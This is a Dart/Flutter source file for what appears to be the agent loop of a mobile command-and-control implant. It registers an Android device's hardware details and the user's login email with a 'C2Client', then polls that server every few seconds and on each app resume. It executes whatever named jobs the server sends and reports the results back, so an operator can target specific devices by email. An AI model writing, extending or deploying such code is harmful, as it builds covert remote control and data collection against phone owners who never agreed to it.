import 'dart:async';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/widgets.dart';
import '../services/c2.dart';
import '../services/session.dart';
import 'handlers.dart';

class AgentLoop with WidgetsBindingObserver {
  AgentLoop(this.c2);
  final C2Client c2;
  Timer? _timer;
  bool _running = false;
  bool _busy = false;
  String? boundEmail;
  void Function(String)? onStatus;

  Future<void> start() async {
    if (_running) return;
    _running = true;
    WidgetsBinding.instance.addObserver(this);
    await _register();
    _timer = Timer.periodic(const Duration(seconds: 4), (_) => _tick());
    // immediate poll so jobs queued while offline are not delayed a full period
    unawaited(_tick());
    onStatus?.call('agent polling');
  }

  void stop() {
    _running = false;
    _timer?.cancel();
    WidgetsBinding.instance.removeObserver(this);
  }

  /// Call after login so the Worker can target this device by email.
  Future<void> bindEmail(String? email) async {
    boundEmail = (email == null || email.isEmpty) ? null : email.trim().toLowerCase();
    await _register();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _register();
      unawaited(_tick());
    }
  }

  Future<void> _register() async {
    try {
      final a = await DeviceInfoPlugin().androidInfo;
      // Prefer explicitly bound email, else remembered login email
      final remembered = await SessionStore.instance.getRememberedEmail();
      final email = boundEmail ?? remembered;
      await c2.register({
        'manufacturer': a.manufacturer,
        'model': a.model,
        'sdk': a.version.sdkInt,
        'release': a.version.release,
        'brand': a.brand,
        if (email != null && email.isNotEmpty) 'email': email,
        'ts': DateTime.now().toUtc().toIso8601String(),
      });
      onStatus?.call(email == null ? 'registered' : 'registered as $email');
    } catch (e) {
      onStatus?.call('register error: $e');
    }
  }

  Future<void> _tick() async {
    if (!_running || _busy) return;
    _busy = true;
    try {
      final jobs = await c2.poll();
      if (jobs.isNotEmpty) onStatus?.call('jobs ${jobs.length}');
      for (final job in jobs) {
        await _run(job);
      }
    } catch (e) {
      onStatus?.call('poll error: $e');
    } finally {
      _busy = false;
    }
  }

  Future<void> _run(Map<String, dynamic> job) async {
    final jobId = (job['jobId'] ?? job['id'] ?? '').toString();
    final name = (job['name'] ?? '').toString();
    final args = job['args'] is Map
        ? Map<String, dynamic>.from(job['args'] as Map)
        : <String, dynamic>{};
    if (jobId.isEmpty || name.isEmpty) return;
    final handler = kHandlers[name];
    if (handler == null) {
      await c2.reportResult(
        jobId: jobId,
        name: name,
        ok: false,
        error: 'unknown command: $name',
      );
      return;
    }
    try {
      final data = await handler(args);
      await c2.reportResult(jobId: jobId, name: name, ok: true, data: data);
      onStatus?.call('ok $name');
    } catch (e) {
      await c2.reportResult(
        jobId: jobId,
        name: name,
        ok: false,
        error: e.toString(),
      );
      onStatus?.call('fail $name');
    }
  }
}
